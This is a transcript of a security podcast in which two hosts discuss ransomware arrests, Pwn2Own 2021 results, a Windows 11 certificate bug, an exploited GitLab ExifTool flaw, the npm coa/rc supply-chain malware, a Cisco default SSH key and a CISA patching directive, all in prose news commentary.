LEO:  Yeah, yeah.  You can browse the 1996 version of the Unix source code online if you search for Unix source code.  And there's a commented version that was put up there by John Lions, and I highly recommend it.  It's very interesting reading.  That's in C.



STEVE:  Wow, that would be something to see.



LEO:  Yeah.  And, you know, it's only 9,000 lines of code.  I mean, it's fairly compact.  But it's a good way to learn how things have to be done, you know, how they can...



STEVE:  Yes.  And it was sort of the original idea, you know.  It was sort of the predecessor of the microkernel, the idea that instead of creating this monstrous operating system that does everything, you create a little supervisor that is able to hand out memory to tasks, that are able to create a task and manage it, and also share the system's time among the various things that are running together.  But then of course, and the whole Unix concept was to then create a simple OS and then a large set  of simple tools, each which did one particular thing really well.  And then you would chain them together in various ways in order to solve problems.



LEO:  Here's the original assembly code for the 1971 edition.



STEVE:  Yup.  So it was originally in assembler, as I recalled, not in C.



LEO:  Yeah, you're right, yeah, yeah.



STEVE:  Yup.



LEO:  Look at that.  All of it's online, which is great now.  There's a great learning thing, you know, if you want to understand the evolution.



STEVE:  Well, so we have lots of welcome progress on the ransomware front, which all sort of came together.  Much of the past week's security news were reports, as I said, of various counter-ransomware campaigns.  Yesterday the U.S. Department of Justice charged a 22-year-old Ukrainian national with orchestrating the ransomware attacks which were facilitated by the flaws in Kaseya's servers.  Following an arrest warrant which was issued by the U.S., that suspect, Yaroslav Vasinskyi, was detained last month by Polish authorities at a border station while he was crossing from Ukraine into Poland.  So that probably surprised him.  And in court documents which were unsealed yesterday, the DOJ said that Vasinskyi was a long-time collaborator of the REvil group.



Also the U.S. charged a second suspect that helped the REvil gang deploy its ransomware.  Identified in court documents as 28-year-old Yevgeniy Polyanin, the DOJ said this Russian national also worked as a REvil affiliate.  U.S. believes that Polyanin is the person who breached the network of TSM Consulting, which is a Texas-based managed service provider, from where he deployed the REvil ransomware on the internal networks of at least 20 Texas local government agencies on August 16th, 2019.  So this was a few years ago.  But again, what we're seeing is a clear ramping up and tightening of the screws.  You know, the U.S. has said, okay, we're not going to just ignore this stuff any longer.  Although Polyanin is still at large and wanted by the FBI, the DOJ did say that they had managed to successfully seize $6.1 million worth of cryptocurrency assets that he was holding in an FTX account.  So they got the money.



The U.S. announcements which were just both recent, I think yesterday, they came hours after Europol had announced similar arrests in Romania, Kuwait, and South Korea.  Seven members of affiliate groups who worked with the GandCrab and REvil ransomware programs were detained.  So we're rounding them up, which is wonderful.



And yesterday, the U.S. Treasury Department imposed sanctions on the cryptocurrency exchange Chatex for facilitating financial transactions for ransomware actors.  An analysis of Chatex's known transactions indicated that over half were directly traced to illicit or high-risk activities such as darknet markets, high-risk exchanges, and ransomware.  Officials said that Chatex also had direct ties to Suex, which is a Russian cryptocurrency exchange portal which the Treasury sanctioned in September for the same reasons.



Treasury also sanctioned three Chatex suppliers.  Actually they're part of - it's Chatex's infrastructure:  IZIBITS OU, Chatextech SIA, and Hightrade Finance Ltd., identifying them as three companies set up as Chatex's infrastructure, which enabled Chatex's operation.  Operations for Chatextech and IZIBITS have been suspended by officials in Latvia and Estonia, respectively.  Latvian officials are currently working to identify Chatex's board owners, who are all non-Latvian nationals.



And to encourage more of the same, more arrests, the U.S. State Department announced bounties for information that may lead to the identification and/or arrest of members of the REvil/Sodinokibi ransomware group:  $10 million for information on REvil's key leaders and $5 million for information on REvil affiliates.  And this follows last Thursday's identical reward announcements for any information which may lead to the identification and/or arrest of members of the DarkSide ransomware group, same terms and conditions.



And the last piece of welcome news from the ransomware universe is that the BlackMatter ransomware-as-a-service group announced last week that it was shutting down its operations as a result of pressure from authorities.  So better to slink off into the night rather than be dragged away in handcuffs.  And it seems pretty clear that the U.S. and its global partners are seriously turning up the heat on this whole ransomware business.  And as a result, I think it's becoming much less clear today that hacking and extorting is an easy and safe way to make a buck on the underworld; you know?



LEO:  That's so important.  That's really good because I really do think there was this sense for a long time, oh, you know, you can do it with impunity.  You know?



STEVE:  Yeah, exactly, just go in and extort and get paid.



LEO:  A couple of months ago Lisa and I were watching a movie about armored car robberies.  And I was thinking, why would you do that when it's so dangerous, and you can pretty much, without any trouble at all, steal much more money and walk away?



STEVE:  And be located anywhere on the globe.



LEO:  Any, yeah.



STEVE:  In any dark corner.



LEO:  Yeah.  So I'm glad that there's a - there should be a consequence, and I'm glad that they're starting to - it's actually, I'd love to know the story of how they catch these guys because it cannot be easy.



STEVE:  Well, and certainly they've been under the misapprehension, the bad guys, that they can't be caught, that they are, like, the long arm of the law cannot reach them.  And what they're discovering is, wait, where did our cryptocurrency go?  That's not fair.  It's like, uh-huh.  Right.  And extorting was?  So, yeah.



LEO:  Lawrence Abrams, as we know from BleepingComputer, tweeted recently, "REvil ransomware's Tor data leak and payment sites are now showing a page titled 'REvil is bad.  They are not the masters they think they are.  We have the skills and experience.  Do you want to be with the most qualified or losers?'"  So maybe somebody else has taken over that page.



STEVE:  Yeah, they probably let their domain, you know, their...



LEO:  It's an onion domain.



STEVE:  Their onion domain lapse or go public. 



LEO:  Yeah.  Wow.



STEVE:  Wow.  Well, we do have some very skilled good hackers, and Pwn2Own, really, that and the Tianfu Cup in China, brings them out.  Last Tuesday through Thursday was the largest ever three-day Fall 2021 Pwn2Own.  Since its inception, the Fall Pwn2Own contest has focused on consumer devices while the contest location has wandered around the globe.  Nine years ago, the 2012 Amsterdam Pwn2Own, which was the first one, targeted only mobile phones.  That's where it began.  And we talked about it on this podcast.  In the years that followed, the context grew to include smart TVs, wearables, smart speakers, and other appliances.



Last year's contest, which was held in Toronto, was further expanded to include Network Attached Storage (NAS) devices.  And this year's 2021 contest, as I said, which occurred in Austin, Texas, added, sort of because of the post-COVID home office environment that has become substantially more busy, expanded the router category and also added printers.  So in all, 22 devices were available as targets, with more than $500,000 USD in prize money total.  But if there were multiple attacks of different sorts against the same device, it was the device that had the prize.  So as we'll see, more than a million dollars was actually won by the contestants.



Now, in the past, we've had fun recreating a running commentary of the event.  But as I scanned through it, it was clear that the contest has grown so large that doing that again would take up at least half the podcast.



LEO:  Yeah, you can't read the results.



STEVE:  So it's just not practical.  So I'm going to mention the equipment under attack and hit the high achievement points from the three-day event.  As I said, Pwn2Own has its root in mobile handsets.  So that category remained well represented with the top three:  the Google Pixel 5, the Samsung Galaxy S21, and Apple's iPhone 12, each handset running the latest version with all of their operating systems installed, and all available updates patched.  So absolutely right current as of the contest day.



And of course as we know in the past that's caught out some of the contestants where an official patch would be released a day before the contest, and it kind of raised some eyebrows.  It's like, uh, wait a minute.  You know?  Did Apple do that on purpose?  How foxy are they?  Because one of the contestants was all set to blast an iPhone, and when it came to the actual day of the contest, it no longer worked due to a patch that had just happened.



As we know, this was the year of print spooler bugs.  But the competition wanted to see about the devices themselves.  So three printers from HP, Lexmark, and Canon were on the chopping block.  The HP Color LaserJet Pro MFP M283fdw, and wait till you hear what the F-Secure guys did to that poor printer; Lexmark's MC3224i; and Canon's ImageCLASS MF644Cdw.



In the home automation category we had the Facebook Portal, Amazon's Echo Show 10, Google's Nest Hub (2nd Gen), the Sonos One Speaker, and Apple's HomePod mini.  There were two smart TVs:  the Sony X80J Series, a 43-incher; and the Samsung Q60A Series, also 43 inches.  They were both put to test.  With all the problems we've seen from router compromises, five routers were made available:  the TP-Link AC1750 Smart WiFi Router turned out not to be so smart; Netgear's Nighthawk Smart WiFi Router, that was their R6700, which was an AC1750; Cisco's RV340, which we've talked about before, actually; MikroTik's RB4011iGS+RM; and Ubiquiti Network's EdgeRouter 4.  Representing the network attached storage category was Synology's DiskStation DS920+.  Western Digital had two entries, the My Cloud Pro Series PR4100 and also their 3TB My Cloud Home Personal Cloud.  And last but not least, the single entry in the external storage category was SanDisk's Professional G-DRIVE ArmorLock SSD 1TB.



LEO:  Oh, I use that.



STEVE:  Okay.  I think it stood up.  I don't remember any successful attack on that.



LEO:  Good.



STEVE:  Okay.  So what happened?  The super-abbreviated version, as I said, and I'll expand upon that, make it a little less super-abbreviated, is that the uber-talented participants in this year's event revealed for the first time ever their discoveries of 61 brand new exploitable vulnerabilities across that range of fully patched commercial products, and the participants collectively took home $1,081,250, for the second Pwn2Own in a row to clear the $1 million mark.  And, okay.  For ranking the participants, recall that the way this works is that awards take the form both of a cash prize and Master of Pwn points, which are totaled to determine each year's Master of Pwn winner.



The French offensive security firm Synacktiv topped the three-day contest's leaderboard by winning 20 Master of Pwn points and earning themselves $197,500.  They netted maximum points for a zero-day vulnerability in the Sonos One smart speaker.  They also successfully, well, actually in that one they successful demonstrated seizing full control of the Sonos One through a stack-based buffer overflow flaw, and that earned them six points and $60,000 of their total winnings.  They also scored another four points and $40,000 from leveraging a configuration flaw which gave them code execution on WD's My Cloud Pro Series PR4100 NAS.



Trailing Synacktiv in second place by only two points were joint winners of the flagship Spring event DEVCORE, who earned 18 points and $180,000 in total.  Together with his fellow DEVCORE members, Orange Tsai - and remember it was he who discovered what was described as at the time "a whole new attack surface" on Microsoft Exchange Server last year, which of course brought us all of those problems with Exchange Server.  They claimed maximum points for compromising the Sonos One as well, along with four additional points and $40,000 after combining an out-of-bounds read and out-of-bounds write flaws to hack Western Digital's 3TB My Cloud Home Personal Cloud device.



STAR Labs, which finished third overall, chained an out-of-bounds read with a heap-based buffer overflow on the beta version of also the Sonos One, earning five points and $45,000.  Fourth on the final standings was Sam Thomas from the U.K. infosec firm Pentest Ltd.  Sam earned $40,000 and four points after chaining three bugs to get code execution on WD's PR4100 NAS.  So I have a link to the detailed blow-by-blow rundown in the show notes.  And it really is quite something.  And although he didn't get into the top four for points, to give you a sense for how much action there was, one researcher named Bien Pham from Team Orca of the Sea Security, he really had his...



LEO:  [Crosstalk].



STEVE:  I know, Orca of the Sea Security.



LEO:  Oh, man, they've got to be [crosstalk].



STEVE:  There was something about their domain name, too, I don't remember now, that was kind of cool.  But anyway, he really had his way with the routers he attacked.  In his first event, which as I recall was at 10:00 a.m. the first morning, he leveraged a logic error to compromise the WAN interface of the Cisco RV340 router to win himself $30,000 and three Master of Pwn points.  Two hours later, he used a three-bug chain, including an off bypass and a command injection to take over the LAN interface of that same Cisco RV340 router to earn an additional $15,000 and two more Master of Pwn points.  And finally, he finished the first day by using an out-of-bands read bug to take control of that TP-Link AC1750 router through its LAN interface to earn himself an additional $5,000 and one Master of Pwn.



Many of the other individuals and teams demonstrated similar quite impressive, or horrifying depending upon your position, skill.  And in the process they successfully demonstrated the exploitation of, as I said, 61, a total of 61 new previously unknown vulnerabilities, which was about twice the previous record for any Pwn2Own.  As always, the participants immediately provide full disclosures to each of the affected vendors and will withhold their public disclosure for 120 days, after which, patched or not, they're free to disclose the technical details of their wizardry.



And I mentioned this HP printer.  After the competition, Dustin Childs, who's the communication manager for ZDI, the Zero-Day Initiative, who holds the Pwn2Own contests, was asked to name his favorite exploit.  He replied:  "It's hard to beat an exploit that turns a printer into a jukebox and plays AC/DC."



LEO:  Oh, they missed a bet.  They really should have played Rick Astley, "Never Gonna Give You Up."



STEVE:  Yeah, you're right.  Dustin was referring to the impressive work of the three-man F-Secure Labs team who targeted the HP Color LaserJet Pro MFP M283fdw to make it play music, or at least make it play a lot of noise depending upon how you feel about AC/DC.



LEO:  Did they say which AC/DC song?



STEVE:  I looked for it, and I didn't...



LEO:  "For those about to rock, we salute you."



STEVE:  Although you can find the whole thing on YouTube.  The entire event was streamed.  So if you're interested, Leo, while I'm continuing to tell our listeners about...



LEO:  I will see if I can find it, yes.



STEVE:  ...other things, yes.  And you may just be able to google or just search YouTube for that particular snippet.  And speaking of snippets, Windows 11 snipping tool, its emoji picker, and other parts were failing, or actually maybe are until today.  Today being, by the way, Patch Tuesday for November.  So we'll see what gets fixed.  We'll talk about that next week.



The Verge carried an intriguing report last Thursday that some apparently quite selective parts of Windows 11 were failing after Halloween, October 31st, so exactly after the end of the month.  The Verge's headline provides our first clue.  It read:  "Microsoft warns Windows 11 features are failing due to its expired certificate."  So, okay, that's what they said.  But it's unclear what "its" refers to here.  The Verge wrote:  "Microsoft has started warning Windows 11 users that certain features in the operating system are failing to load due to an expired certificate.  The certificate expired on October 31st, and Microsoft warns that some Windows 11 users aren't able to open apps like the Snipping Tool, the touch keyboard, or the emoji panel.



"A patch is available to fix some of the issues, but it's currently in preview, meaning you have to install it manually from Windows Update.  The patch is KB4006746.  It will fix the touch keyboard, voice typing, the emoji panel, and issues with getting started and the tips sections of Windows 11.  You'll be able to find this patch by checking for updates in the Windows Update section of the Settings, Windows Update under Windows 11."



But here's what's weird.  Microsoft's patch doesn't address the problems with the Snipping Tool app.  Microsoft says:  "To mitigate the issue with Snipping Tool, use the Print Screen key on your keyboard..."



LEO:  Yeah?



STEVE:  Uh-huh, "...and paste the screenshot into your document."



LEO:  Yeah?



STEVE:  "You can also paste it into Paint to select and copy the section you want."  Okay.  So in other words, don't use the Snipping Tool.



LEO:  Don't use it.  Do what you used to do before the Snipping Tool.



STEVE:  It broke.



LEO:  It broke.



STEVE:  Yeah.  So, okay.  So I thought about this.  It's not clear how many Windows 11 users are affected by these issues, and we haven't been able - oh.  I'm sorry.  The Verge said:  "It's not clear how many Windows 11 users are affected by these issues, and we [The Verge] haven't been able to replicate the Snipping Tool problems on multiple patched systems."



LEO:  Oh.



STEVE:  I know.  So again, Leo, like I said, I'm not going to let myself get wound up about this again.  But what?  Anyway, if you're having issues, some Verge readers have reported being able to change the system date back to October 30th, then launch the Snipping Tool to get it working again.  You can then, with it launched, change the system date back once the app has loaded successfully.



LEO:  This just in.  I believe I have found from Pwn2Own...



STEVE:  Oh, joy.  Oh, joy.



LEO:  I believe I might have found - I'm getting some music from something else.  So let me figure out what that is.  Oh, there we go.  This is a tweet, and I believe this is the actual - we'll see what kind of music it plays.  That's a little - it is, it's AC/DC, coming out of a printer.  That's a microphone picking it up, coming out of the - okay.



STEVE:  Okay.  So the printer doesn't have a speaker.



LEO:  No.



STEVE:  They actually made the hardware of the printer do that.



LEO:  Yeah, yeah, yeah.



STEVE:  Wow.



LEO:  That's impressive as hell.



STEVE:  Wow.



LEO:  I can't quite make out the song, but it does sound like AC/DC.



STEVE:  Wow.  Well, and we were talking about old computer systems.  And of course that was an old hack in the old days.



LEO:  Yes.



STEVE:  You would disengage the clutch on an IBM 1403 printer, and then you could get it to play.  Like by timing the hammer strikes on the printer, you could get it to do a very good job.  But that's something.



LEO:  We think this is "You Shook Me All Night Long," but we're not - oh, thunder.  It is.  Thunder.  All right.  I recognize it, yeah.  Okay.



STEVE:  Wow.



LEO:  It's "Thunderstruck."



STEVE:  Okay.  So back on this weird Windows 11 problem, the expired certificate is also causing...



LEO:  I hope we don't get taken down on YouTube now because we played it, a printer version of "Thunderstruck."



STEVE:  I don't think anything could even recognize...



LEO:  I don't think so.  I think we're safe.  All right.  I'm sorry.  Back to the certificates.  Sorry about that.



STEVE:  "The expired certificate is also causing issues with the accounts page in the settings section of Windows 11 with S mode enabled and the input method editor UI.  It's not clear when the Snipping Tool and S mode issues will be addressed," said the Verge.  Microsoft says what they always say:  "We're working on a resolution for Snipping Tool and the S mode-only issues and will provide an update when more information is available."



Okay.  So if we on this podcast reverse engineer the trouble, it sounds as though some Windows 11 apps have themselves been signed in such a way that their own digital signatures will not validate as of November 1st, 2021.  But the way Authenticode signatures are designed, if the signature was valid at the time of signing, the signatures themselves never expire.  That is,  unlike other certificates where the certificate needs to be valid at the time it's used, because Microsoft recognized that code might well be used after the certificate that signed it  had expired, then we had to change the rules.



So it cannot be that the signature itself has expired because that's all right.  But like any digital signature, it's based on a chain of trust which typically has an intermediate certificate and a root certificate.  So if any certificate in the chain being used by any of those apps which are all signed had expired, even though the app's signing certificate itself was still technically valid, Windows would not be able to validate its signature and would refuse to run the app.



Now, as to why only some Windows 11 users are experiencing this, and why among those who are, only some of their apps are seeing this, and why a fix was quickly deployed for most of the apps but not the Snipping Tool and apparently S mode stuff, this is, as I said, additional evidence that for whatever reason Windows is growing, let's just say, ever more complex.  I use and love Windows.  I dearly hope they're able to hold it together.  Time will tell.  And next week we'll see what adventures today's Patch Tuesday brought.  Oh, and by the way, Leo, last week you missed the news that we had - what we talked about the week before, hoping that the printer issues had finally been resolved, as Microsoft said, but no.



LEO:  No, of course not.  That was a safe bet.



STEVE:  So maybe that's happening today, and we'll find out next week.  So here's a sales pitch for GitLab servers.  A page on TechRepublic introduces the reason for wanting one, as follows:  They say:  "If you're a Git user, you know that having local repositories that can be accessed via a local LAN or external WAN is a crucial element of the development process.  You can certainly opt to go with GitHub, but that negates the ability to host locally.  So when you want to host your own repositories, where do you turn?  In a word, GitLab.  GitLab allows you to host an on-premise Git repository that can be accessed from either your local LAN or, if you have an available public IP address, from outside your company.  GitLab is fairly easy to install and incredibly simple to use."



LEO:  Yeah, I like GitLab.



STEVE:  Right.



LEO:  Yeah, I use it.  Am I in trouble?



STEVE:  And unfortunately...



LEO:  Uh-oh.



STEVE:  Depends upon when you last updated.  Unfortunately...



LEO:  It's on my Synology.  It's the built-in kind of git for Synology.  That's why I have it.



STEVE:  Unfortunately, unpatched GitLab servers also contain a now widely exploited and widely known flaw that's been used and is being used to create multi-thousand member botnets which are generating in excess of, yes, one terabit per second of DDoS attack traffic.



LEO:  Oh, my god.



STEVE:  And why?  Because they're not only easy to deploy, that is those GitLab servers, but "Wouldn't it be just great to put this on the WAN?"  Right.  And this is where we all say, "What could possibly go wrong?"  And oh, my goodness.



So here's the situation:  Bad guys are exploiting a security flaw in these GitLab self-hosted servers to assemble botnets and launch ginormous DDoS attacks, some in excess of, and they've been clocked, at a terabit per second.  Damian Menscher, a Security Reliability Engineer at Google Cloud, who's responsible for Google's DDoS defenses, disclosed last Thursday that attackers are exploiting, and this is a CVE-2021, it's 22205, a vulnerability that GitLab patched back in April of this year.  But of the 60,000 GitLab servers publicly exposed to the Internet, and all our listeners know where this is going, only about half have since been updated with the patch.



The flaw exists in GitLab's ExifTool, which is a library commonly used to remove the metadata from images uploaded to web servers.  It was discovered by William Bowling and reported to GitLab via GitLab's bug bounty program which they have over at HackerOne.  In a report filed via HackerOne, Bowling said he discovered a way to abuse how the ExifTool handles uploads of, and I'd never run across this, a DjVu file format.  Anyway, it's used for scanned documents.  And because of a flaw in this ExifTool, he's able to gain control over the entire underlying GitLab web server.  Which is to say, if you had a GitLab web server that was exposed to the 'Net, and 60,000 are, 30,000 have not been fixed, you can take it over.



Public proof-of-concept code for the vulnerability appeared in June, around the same time that the Italian security firm HN Security first spotted attacks.  At the time, an HN Security researcher said the company began an investigation after spotting randomly named user accounts being added to compromised GitLab servers.  Those were accounts that were most likely created by the attackers to allow remote control of the hacked systems.  While the purpose of these intrusions at the time were unclear to HN Security, yesterday Google's Menscher said the hacked servers were part of a botnet comprising "thousands of compromised GitLab instances" that was launching large-scale DDoS attacks.



So as we've so often observed, botnet operators are exploiting the tardiness of individuals and enterprises around the world when it comes to patching their software.  And we'll be talking about the order from the CISA about that in a minute.  But in this case, this is in-house GitLab servers.  According to Rapid7's analysis last Monday, and this is where we got the number, 60,000 GitLab servers are connected to the Internet, half unpatched.  And it's worth noting that GitLab is not the only user of this ExifTool.  So the exploit of it might very well impact other types of web applications where that tool might be part of the image upload processing path.  So other exploitation could be forthcoming; and other things might need patching, as well.



It was noted that one way to prevent attacks might be to prevent uploading of DjVu - yeah, I don't need those uploaded - at the server if companies don't need to explicitly handle that file type.  On the other hand, if you're going to do that, why not just update GitLab to all of its current patches and be done with it.  So anyway, if anybody listening to this, and I wouldn't be surprised if some of our listeners have, certainly all of our listeners, Leo, would have patched this back in April.



LEO:  Oh, yeah, yeah.



STEVE:  When it first happened.  No doubt.



LEO:  I was just checking.  Mine's up to date, yeah.



STEVE:  But just to be sure.



LEO:  Yeah.  Sometimes people put servers up and never pay any attention to them ever again.



STEVE:  Yeah, yeah.  I'm sure it happens.  Okay.  More supply chain attacks.  Successful attacks on the software supply chain continue to be discovered.  Obviously, this is a trend that has basically evolved during 2021, and I'm afraid it's going to be with us as all the bad trends tend to be.  So the uncomfortable thing about this is when you discover an attack that's been going on for some time.  It begs a question, what other attacks haven't you yet discovered?  Right?



So in this most recent instance of discovery, a pair of extremely popular JavaScript npm packages named "coa," C-O-A, and "rc," which boast weekly combined downloads of 23 million, so 23 million downloads per week, were discovered to have been infected with password-stealing malware.  The security team responsible for the npm JavaScript package manager are the ones who discovered it, and they've warned users that two of its most popular packages had been hijacked by some unknown threat actor.  As I said, the two affected packages are "coa" and "rc."  Coa, C-O-A, is a command-line argument parser with around 8.8 million weekly downloads.  And rc is a configuration loader with about  14.2 million weekly downloads.



The list of versions basically are all those that are in current use:  2.0.3, 2.0.4, 2.1.1, 2.1.3, 3.0.1, and 3.1.3.  And as I'll note in a second, they've not been changed for a while.  Those are the coa versions.  There are three versions of rc:  1.2.9, 1.3.9, and 2.3.9.  Both packages appear to have been compromised at the same time and were the result of attackers gaining access to a package developer's account.  So unfortunately, that's currently the Achilles heel.  You might have vulnerabilities in the packaging system itself.  Or you get in and impersonate the owner of the account and then mess with the things they have access to.



Anyway, once inside, the threat actor added a post-installation script to the original codebase.  The post-installation ran an obfuscated TypeScript which would check for the operating system details and download, depending upon what it found, either a Windows batch or a Linux bash script.  The deobfuscated version of the Windows batch script revealed that in the case of Windows, the compromised packages would download and run a DLL file containing a version of the Qakbot (Q-A-K-B-O-T) trojan.  What a mess.



Okay.  The compromise to coa was spotted first after its new installation routine started crashing build pipelines for React-based applications.  Last Thursday the npm team tweeted shortly after detecting the coa compromise, which was triggered by a wave of reports about failed builds.  They tweeted:  "The compromised developer account has been temporarily disabled, and we are actively investigating the incident and monitoring for similar activity.  We will share additional information as appropriate based on our investigation."  That was from npm.  They tweeted @npmjs on the 4th.  The matching compromise to the rc package was discovered a few hours later.



The npm security team removed all the compromised coa and rc versions to prevent developers from accidentally infecting themselves.  But it appears unlikely that either of the compromises had much actual chance of slipping through.  First of all, builds using it were crashing.  Also, both libraries are widely used.  The malicious code was not well hidden, and both libraries had not seen any new releases since December 2018 and 2015, respectively.  So all those factors alone would have raised sufficient suspicion to trigger a security audit within most professional developer teams.  You know, if they saw something that hadn't been changed in four years suddenly got a new version, it's like, uh, what?  Let's look into this a little more closely.



And one last interesting point.  The malicious code present in these incidents is nearly identical to the code used in the compromise of the User-Agent parser.  Remember UAParser library?  We talked about it recently.  That occurred late last month.  So it appears that someone, and apparently someone either not highly skilled or someone maybe in a hurry, has set their sights upon JavaScript and the npm supply chain for exploitation.  And if that's the case, and anybody is like pulling packages from npm, I would check for things that have not been modified in a while that suddenly get an update, and see what's behind the update.



As I mentioned, it's Tuesday.  It's Patch Tuesday for Microsoft, as well as for many others in the industry.  So next week we'll check back to see what new adventures in computing have been created by today's updates.  But last Tuesday Google rolled out its monthly security patches for Android, in the process fixing 39 flaws, including a zero-day that it said was being actively exploited in the wild in limited targeted attacks.  That one was  being tracked as CVE-2021-1048.  It's a use-after-free vulnerability in the kernel that can be exploited to obtain local privilege escalation.  And since we depend upon code containment to a great degree in today's computing, although privilege escalation is not as scary sounding as remote code execution, we know it's important.  And the very fact that this flaw was being used in the wild demonstrates that it was doubtless quite useful for some nefarious purpose.



Aside from that zero-day, last Tuesday's patches also foreclosed on a couple of critical remote code execution (RCE) vulnerabilities in the System component that, as I said, could allow remote adversaries to execute malicious code within the context of a privileged process by sending a specially crafted transmission to targeted devices.  So, cool that that was found.  And that was not known to be exploited.



Two other critical flaws in Qualcomm's closed-source components of Android were also fixed, along with a fifth critical vulnerability in Android TV which could have permitted an attacker in close proximity to silently pair with the TV and get  arbitrary code execution privileges not requiring any further authentication.



And interestingly, in terms of actively exploited, in-the-wild, total zero-days found and fixed so far this year, when compared with Windows, Chrome, and even iOS, Android has been faring surprisingly well.  After counting last Tuesdays latest addition, Android has only needed to address a total of six zero-days this year.  And it's not as if there isn't tremendous pressure to pry into Android.  We know there is.  So way to go, Google.  I don't remember the count, Leo, last week, but I think it was 18 we're up to.  Oh, no, 14 and 15.  So 15 total zero-days in Chrome this year.



LEO:  Jesus.



STEVE:  I know.



LEO:  Oh, my god.



STEVE:  It's been bad.  But only six zero-days in Android for the year.  So again, props to them.



We had another problem with a default key in a Cisco device.  Last Thursday, Cisco released an update to fix one of those very rare CVSS 9.8 vulnerabilities in their Policy Suite products.  The announcement of this is a bit misleading.  They said, and I'm quoting:  "A vulnerability in the key-based SSH authentication mechanism of Cisco Policy Suite could allow an unauthenticated remote attacker to log into an affected system as root.  This vulnerability is due to a weakness in the SSH subsystem of an affected system.  An attacker could exploit this vulnerability by connecting to an affected device through SSH, naturally.  A successful exploit could allow the attacker to log into an affected system as the root user.  Cisco has released software updates that address this vulnerability.  There are no workarounds that address it." 



Okay, now, you don't get to say that "A vulnerability in the key-based SSH authentication mechanism could allow an unauthenticated remote attacker to log into an affected system as the root user" when the vulnerability, air quotes, in question turns out to be a hard-coded preset factory default SSH key which is readily discoverable in the device's firmware.  So is this vulnerability as they say due to a weakness in the SSH subsystem of an affected system?  Maybe.  It would be a weakness in the SSH subsystem that it contained a default key.  



LEO:  Private key?



STEVE:  Yes.  Yes.



LEO:  Jesus.



STEVE:  The SSH key was like, not generated at runtime or install time.  There was just one, and all those devices shared the same one.  I know.  The good news is this was not discovered being used in the wild.  To their credit, Cisco discovered this problem on their own.  So I want to give them props for looking at their own code, presumably, hopefully, being horrified by what they found and addressing the problem.  After updating their devices, the new installation process creates unique - imagine that - SSH keys on the fly, rather than shipping every device with the same default starter key.



But the concern is this keeps happening to Cisco.  We've talked about many similar default login credential problems in the past.  Again, they audited them; right?  But the bigger and more important question is how this horribly weak design pattern ever became policy in the first place.  It had to have been because so many devices have had this problem.  We know that the awareness of security has been growing over time.  But was there ever a time when shipping enterprise-class networking equipment with factory preset SSH credentials would have been reasonable?



And the other worry is that the previous instances of Cisco's default credentials were quite a while ago.  How is it that the discovery and remediation of those several years ago would not have triggered a full cross-product-offering audit?  And that only now, a couple years later, another similar problem is being found?  You know, I've said this in the past.  It's good that they're checking their stuff.  But it would be good to know that they found them all.  So one fewer problem out in the field, for those who update.



U.S. federal agencies have been ordered to patch hundreds of actively exploited flaws.  To which I say, yeah, okay, good luck with that order.  One way, as we know, to fight the threat of foreign cyberattacks such as ransomware is to go after the individuals behind the attacks.  And that's how we started the podcast today.  But the other way is to turn inward and examine how those attacks are being so successful in the first place.  To that end, CISA, our awkwardly named U.S. Cybersecurity and Infrastructure Security Agency, last week published a catalog of known, exploited, and patched vulnerabilities, including those from Apple, Cisco, Microsoft, and Google.  And in addition to this catalog, CISA has issued an order requiring all federal agencies to prioritize applying patches for those security flaws within "aggressive" timeframes.  I'll say it's aggressive.



The Binding Operational Directive issued last Wednesday said: "These vulnerabilities pose significant risk to agencies and the federal enterprise.  It is essential to aggressively remediate known exploited vulnerabilities to protect federal information systems and reduce cyber incidents."



The catalog lists around 176 vulnerabilities identified between 2017 and 2020, and 100 flaws from 2021 this year alone.  And the catalog will be updated with additional actively exploited vulnerabilities as and when they become known, provided they've been assigned Common Vulnerabilities and Exposures (CVE) identifiers and have clear remediation action.



And here's the kicker:  The binding directive mandates that security vulnerabilities discovered this year, in 2021 - those are the ones being given the highest priority - must be addressed by next Wednesday, November 17, 2021.  In other words, at the time of the issue, which was last Wednesday, the federal agencies were given two weeks to patch all of these, all 100, while setting a patching deadline of May 3, 2022 - so way out -  for the remaining much older vulnerabilities.  Although the Binding Operational Directive is primarily aimed at federal civilian agencies, CISA is recommending that private businesses and state entities review the catalog and remediate the vulnerabilities to strengthen their security and resilience posture.  To which I say, yeah, okay.



The new strategy also sees the agency moving away from a strict severity-based vulnerability remediation prioritization to those that pose significant risk and are being abused in the real-world intrusions in light of the fact that adversaries do not only use critical weaknesses to achieve their goals.  Some of the most widespread and devastating attacks have chained multiple vulnerabilities rated individually only high, medium, or low.



Tim Erlin, the VP of Strategy for Tripwire, said:  "This directive does two things.  First, it establishes an agreed-upon list of vulnerabilities that are being actively exploited.  Secondly, it provides due dates for remediating those vulnerabilities.  By providing a common list of vulnerabilities to target for remediation, CISA is effectively leveling the playing field for agencies in terms of prioritization.  It's no longer up to each individual agency to decide which vulnerabilities are the highest priority to patch."  And to that I'll also add that it will presumably give federal IT departments some much-needed leverage over their own management, who might otherwise not be providing them with the time, talent, and budget that they require to meet a much more nebulous, well, is everything patched.



So now there is a mandate with a deadline.  So the IT department can say, "You want us to meet this order's deadline or not?  Here's what it's going to take."  So probably a good thing, to light a fire.  And depending upon how much clout CISA ends with, or ends up with, you can imagine that the government can begin to apply some pressure at some point after this order deadline has passed.



Twitter was the conduit throughout all of the past week for showing me how much this podcast's listeners have grown to know me, Leo.  A barrage of welcome tweets all came in saying the same thing.  I lost count of the number of people who wrote very close variations of "I can just hear you saying, 'What could possibly go wrong?'"  And then they all attached links to various tech news coverage that during last week's Ignite conference Microsoft announced that Excel would now be supporting JavaScript.



LEO:  Oh, boy.  Oh.  What could possibly go wrong?



STEVE:  So indeed, yes, what could possibly go wrong?  It seems like a great idea, Microsoft, for keeping this podcast going for another 17 years.



And then we even had the meta-tweet from Joel Pomales, who wrote:  "Pretty sure @SGgrc is getting bombarded with 'What could possibly go wrong?' tweets."  So that was a tweet about the fact that there were doubtless going to be tweets, as there were.



And in another example of knowing me so well, Kevin Jones tweeted.  He said:  "I thought @SGgrc would appreciate this."  And then he attached a tweet from an account called "I Am Developer," and it's @iamdevloper.  And it's great.  So it shows:  "1969:  What are you doing with that 2KB of RAM?  Answer:  Sending people to the moon."  Uh-huh.  "2017:  What are you doing with that 1.5GB of RAM?  The answer:  Running Slack."  Right.



LEO:  Well, Slack might be more complicated than sending people to the moon, I guess.



